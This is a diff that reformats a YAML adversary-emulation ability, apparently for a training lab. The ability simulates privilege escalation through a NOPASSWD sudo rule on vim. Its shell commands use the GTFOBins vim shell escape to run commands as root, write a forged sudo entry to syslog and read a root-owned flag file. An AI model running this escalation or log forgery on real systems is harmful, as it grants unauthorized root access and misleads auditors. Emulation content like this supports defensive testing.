@@ -1,4 +1,5 @@
 - name: 'NovaTech: Sudo vim GTFOBin Privilege Escalation'
+  id: c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8
   description: >-
     Simulates an attacker abusing a misconfigured sudoers rule that grants NOPASSWD
     access to /usr/bin/vim. Using the GTFOBins technique, vim is leveraged to spawn
@@ -10,29 +11,29 @@
   repeatable: true
   delete_payload: false
   executors:
-  - name: sh
-    platform: linux
-    command: >-
-      echo "[*] Simulating sudo vim privilege escalation on nova-gateway";
-      echo "[*] Current user: $(whoami), checking sudo rules";
-      sudo -l 2>/dev/null | grep vim || echo "Note: Run as devops user for full simulation";
-      echo "[*] Executing GTFOBin escalation: sudo vim -c :!/bin/bash";
-      sudo vim -c ':!id > /tmp/sudo_vim_proof.txt; echo "PRIVESC_SUCCESS" >> /tmp/sudo_vim_proof.txt' /dev/null 2>/dev/null ||         echo "[SIM] sudo vim escalation would execute as root if run as devops";
-      cat /tmp/sudo_vim_proof.txt 2>/dev/null;
-      logger -t sudo "devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/vim [GTFOBin escalation - SIMULATION]";
-      echo "[!] Privilege escalation via sudo vim simulated" > /tmp/sudo_abuse.log;
-      cat /root/flag3.txt 2>/dev/null || echo "[SIM] Would read /root/flag3.txt as root";
-      echo "[*] Sudo GTFOBin simulation complete"
-    code: null
-    language: null
-    build_target: null
-    payloads: []
-    uploads: []
-    timeout: 60
-    parsers: []
-    cleanup:
-    - rm -f /tmp/sudo_vim_proof.txt /tmp/sudo_abuse.log
-    variations: []
-    additional_info: {}
+    - name: sh
+      platform: linux
+      command: |
+        echo "[*] Simulating sudo vim privilege escalation on nova-gateway"
+        echo "[*] Current user: $(whoami), checking sudo rules"
+        sudo -l 2>/dev/null | grep vim || echo "Note: Run as devops user for full simulation"
+        echo "[*] Executing GTFOBin escalation: sudo vim -c :!/bin/bash"
+        sudo vim -c ':!id > /tmp/sudo_vim_proof.txt; echo "PRIVESC_SUCCESS" >> /tmp/sudo_vim_proof.txt' /dev/null 2>/dev/null || \
+          echo "[SIM] sudo vim escalation would execute as root if run as devops"
+        cat /tmp/sudo_vim_proof.txt 2>/dev/null
+        logger -t sudo "devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/vim [GTFOBin escalation - SIMULATION]"
+        echo "[!] Privilege escalation via sudo vim simulated" > /tmp/sudo_abuse.log
+        cat /root/flag3.txt 2>/dev/null || echo "[SIM] Would read /root/flag3.txt as root"
+        echo "[*] Sudo GTFOBin simulation complete"
+      code: null
+      language: null
+      build_target: null
+      payloads: []
+      uploads: []
+      timeout: 60
+      parsers: []
+      cleanup:
+        - rm -f /tmp/sudo_vim_proof.txt /tmp/sudo_abuse.log
+      variations: []
+      additional_info: {}
   requirements: []
-  id: c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8
